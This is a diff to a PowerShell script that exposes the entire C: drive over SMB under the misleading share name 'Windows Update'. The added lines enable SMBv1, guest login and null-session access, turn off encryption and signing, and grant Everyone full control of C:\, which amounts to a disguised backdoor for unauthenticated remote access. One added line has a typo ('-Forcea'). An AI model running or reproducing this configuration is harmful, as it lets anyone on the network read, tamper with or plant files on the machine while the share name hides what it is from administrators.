@@ -35,7 +35,18 @@ Set-NetFirewallRule -DisplayGroup "File and Printer Sharing" -Enabled True -Prof
 # Set registry values for allowing anonymous access to the drive
 Write-Host "Modifying registry settings for anonymous access..."
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name everyoneincludesanonymous -Value 1 -Force
-Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters\' -Name restrictnullsessacces -Value 0 -Force
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" -Name restrictnullsessacces -Value 0 -Force
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "AllowInsecureGuestAuth" -Value 1 -Forcea
+
+# Ensure SMBv1 is enabled (if necessary, as it is deprecated)
+Write-Host "Enabling SMBv1..."
+Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force
+Set-SmbServerConfiguration -EncryptData $false -Force
+Set-SmbServerConfiguration -RejectUnencryptedAccess $false -Force
+Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
+Set-SmbServerConfiguration -EnableGuestLogin $true -Force
+Set-SmbServerConfiguration -AutoShareServer $true -Force
+Set-SmbServerConfiguration -EnableSecuritySignature $false -Force
 
 # Ensure TCP/UDP Ports are open in target machine's firewall
 Write-Host "Allowing TCP/UDP Ports..."
@@ -57,7 +68,15 @@ Write-Host "Sharing C: drive..."
 New-SmbShare -Name "Windows Update" -Path "C:\"
 Grant-SmbShareAccess -Name "Windows Update" -AccountName "Everyone" -AccessRight Full -Force
 
-Restart-Service -Name "LanManServer"
+# Set permissions for the shared drive
+Write-Host "Setting permissions for the shared drive..."
+$acl = Get-Acl "C:\"
+$permission = "Everyone","FullControl","ContainerInherit,ObjectInherit","None","Allow"
+$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
+$acl.SetAccessRule($accessRule)
+Set-Acl -Path "C:\" -AclObject $acl
+
+Restart-Service -Name "LanManServer" -Force
 
 Write-Host "All actions completed successfully."
 
